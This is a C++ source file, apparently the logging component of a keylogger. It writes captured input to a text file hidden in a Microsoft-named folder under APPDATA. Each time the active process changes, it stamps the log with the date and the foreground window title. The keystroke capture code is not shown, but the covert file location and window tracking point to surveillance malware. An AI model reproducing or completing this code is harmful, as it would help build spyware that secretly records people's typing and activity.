#include "stream.h"
#include <iostream>

#define APPDATA "APPDATA"


std::string Stream::GetPath(const std::string &dir) {
  char *buf = nullptr;
  size_t size = 0;
  std::string finalDir;

  if (_dupenv_s(&buf, &size, APPDATA) == 0 && buf != nullptr) {
	finalDir = buf;
  }
  finalDir += dir;
  free(buf);
  return finalDir;
}

bool Stream::MakeDir(const std::string &path) {
  return CreateDirectory(path.c_str(), nullptr)
	  || GetLastError() == ERROR_ALREADY_EXISTS;
}

bool Stream::WriteLog(const std::string &input, uint32_t &active, const bool blockProcessInfo) {
  bool processInfo = false;
  uint32_t cur = system_data::GetProcessId();
  if (system_data::ProcessChanged(active, cur, true)) {
	processInfo = true;
  }

  logFile->Ofstream.open(logFile->PathFull, std::fstream::app);
  if (!logFile->Ofstream.is_open()) {
	return false;
  }
  if (processInfo && !blockProcessInfo) {
	logFile->Ofstream << std::endl << "[" << SysTime::SystemTime::Now().GetFullDate() << " "
					  << convert::HwndToString(GetForegroundWindow()) << "]" << std::endl;
  }
  logFile->Ofstream << input;
  logFile->Ofstream.close();
  return true;
}
bool Stream::MakeFile() {
  try {
	logFile = new Stream::LogFile(Stream::GetPath(R"(\Microsoft\blxr\)"), "blxr.txt");
  } catch (...) {
	return false;
  }
  return true;
}

